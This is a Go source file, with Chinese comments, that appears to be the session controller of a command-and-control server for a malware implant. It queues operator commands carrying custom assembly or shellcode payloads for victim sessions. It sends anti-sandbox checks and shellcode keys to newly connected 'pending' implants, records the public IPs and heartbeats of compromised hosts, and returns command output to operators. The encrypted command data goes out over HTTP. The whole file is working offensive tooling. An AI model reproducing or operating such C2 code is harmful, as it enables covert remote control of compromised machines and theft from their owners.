package SessionController

import (
	"Server/Public"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"github.com/gin-gonic/gin"
	"math/rand"
	"strconv"
	"time"
)

type CommandController struct{}

// 部分正式上线会话信息字典: [SID: [连接时间: xxx, 自定义汇编哈希列表: xxx], ...]
var PartSessionInfoMap = make(map[string]map[string]interface{})

// 部分待定会话信息字典: [SID: [连接时间: xxx, ShellCode密钥: xxx, 待定状态: xxx], ...]
var PartPendingSessionInfoMap = make(map[string]map[string]string)

// 命令数据字典: [SID: [[命令ID: xxx, 参数Hex: xxx, 数据: xxx], ...], ...]
var CommandDataMap = make(map[string][]map[string]string)

// 用户命令字典: [命令ID: [用户名: xxx, 相关参数: xxx], ...]
var UserCommandMap = make(map[string]map[string]string)

// 添加命令数据
func (p CommandController) AddCommandData(username string, c *gin.Context) {
	// 构造命令数据: {命令ID:xxx, 自定义汇编/哈希:xxx, 自定义汇编函数参数:xxx}
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	commandId := strconv.Itoa(random.Intn(10000000))
	commandDataMap := make(map[string]string)
	commandDataMap["commandId"] = commandId
	commandDataMap["paraHex"] = c.PostForm("paraHex")
	commandDataMap["data"] = c.PostForm("selfAsm")
	if len(PartSessionInfoMap[c.PostForm("sid")]["selfAsmHashList"].([]interface{})) > 0 {
		for _, selfAsmHashMap := range PartSessionInfoMap[c.PostForm("sid")]["selfAsmHashList"].([]interface{}) {
			selfAsmHash := selfAsmHashMap.(map[string]interface{})["selfAsmHash"].(string)
			if selfAsmHash == c.PostForm("selfAsmHash") {
				commandDataMap["data"] = c.PostForm("selfAsmHash")
				break
			}
		}
	}
	// 命令数据 -> 命令数据字典
	CommandDataMap[c.PostForm("sid")] = append(CommandDataMap[c.PostForm("sid")], commandDataMap)

	// 注册用户命令
	commandInfoMap := make(map[string]string)
	for para, value := range c.Request.PostForm {
		if para != "paraHex" && para != "selfAsm" && para != "selfAsmHash" {
			commandInfoMap[para] = value[0]
		}
	}
	commandInfoMap["username"] = username
	UserCommandMap[commandId] = commandInfoMap
	c.String(200, "success")
}

// 处理待定会话
func ProcessPendingSession(sessionInfoMap map[string]interface{}, listenerName string, c *gin.Context) {
	sessionInfoMap["publicIP"] = c.ClientIP()
	sessionInfoMap["listenerName"] = listenerName
	sessionInfoMap["heartbeat"] = strconv.Itoa(int(time.Now().Unix()))
	// 待定会话信息 -> 部分待定会话信息字典
	_, exist := PartPendingSessionInfoMap[sessionInfoMap["sid"].(string)]
	if !exist {
		partSessionInfo := make(map[string]string)
		partSessionInfo["shellcodeKey"] = sessionInfoMap["shellcodeKey"].(string)
		partSessionInfo["connectTime"] = time.Now().Format("2006.01.02 15:04:05")
		partSessionInfo["pending"] = "true"
		partSessionInfo["command"] = "\x03\x00\x00"
		PartPendingSessionInfoMap[sessionInfoMap["sid"].(string)] = partSessionInfo
	}
	sessionInfoMap["connectTime"] = PartPendingSessionInfoMap[sessionInfoMap["sid"].(string)]["connectTime"]
	sessionInfoMap["pending"] = PartPendingSessionInfoMap[sessionInfoMap["sid"].(string)]["pending"]

	sessionInfoJson, _ := json.Marshal(sessionInfoMap)
	Public.AddNewData("AddPendingSessionInfo", "C2 Server", string(sessionInfoJson))

	// 下发抗沙箱命令: 判定结果 + ShellCode密钥
	c.String(200, PartPendingSessionInfoMap[sessionInfoMap["sid"].(string)]["command"])
	PartPendingSessionInfoMap[sessionInfoMap["sid"].(string)]["command"] = "\x03\x00\x00"
}

// 处理正式上线会话
func ProcessSession(sessionInfoMap map[string]interface{}, selfAsmHashList []interface{}, commandOutputDataList []interface{}, listenerName string, c *gin.Context) {
	sessionInfoMap["publicIP"] = c.ClientIP()
	sessionInfoMap["listenerName"] = listenerName
	sessionInfoMap["heartbeat"] = strconv.Itoa(int(time.Now().Unix()))
	// 部分正式上线会话信息 -> 部分正式上线会话信息字典
	_, exist := PartSessionInfoMap[sessionInfoMap["sid"].(string)]
	if !exist {
		partSessionInfo := make(map[string]interface{})
		partSessionInfo["connectTime"] = time.Now().Format("2006.01.02 15:04:05")
		PartSessionInfoMap[sessionInfoMap["sid"].(string)] = partSessionInfo
	}
	PartSessionInfoMap[sessionInfoMap["sid"].(string)]["selfAsmHashList"] = selfAsmHashList
	sessionInfoMap["connectTime"] = PartSessionInfoMap[sessionInfoMap["sid"].(string)]["connectTime"].(string)

	sessionInfoJson, _ := json.Marshal(sessionInfoMap)
	Public.AddNewData("AddSessionInfo", "C2 Server", string(sessionInfoJson))

	for _, commandOutputData := range commandOutputDataList {
		commandId := commandOutputData.(map[string]interface{})["commandId"].(string)
		outputData, err := hex.DecodeString(commandOutputData.(map[string]interface{})["data"].(string))
		if err != nil {
			continue
		}
		commandInfoMap := UserCommandMap[commandId]
		commandInfoMap["outputDataBase64"] = base64.StdEncoding.EncodeToString(outputData)
		commandInfoJson, _ := json.Marshal(commandInfoMap)
		Public.AddNewData("CommandOutput", commandInfoMap["username"], string(commandInfoJson))
		delete(UserCommandMap, commandId)
	}

	// 下发 正式上线会话 命令数据
	IssueCommandData(sessionInfoMap["sid"].(string), c)
}

// 下发 正式上线会话 命令数据
func IssueCommandData(sid string, c *gin.Context) {
	if len(CommandDataMap[sid]) == 0 {
		c.String(200, "")
		return
	}
	// 命令数据 <- 命令数据字典
	commandDataJson, _ := json.Marshal(CommandDataMap[sid])
	delete(CommandDataMap, sid)
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	commandDataJson = append(commandDataJson, []byte("\x00")...)
	commandDataJson = EncryptData(append(commandDataJson, byte(random.Intn(10))))
	c.Writer.Header().Set("Content-Length", strconv.Itoa(len(commandDataJson)))
	c.Data(200, "application/octet-stream", commandDataJson)
}
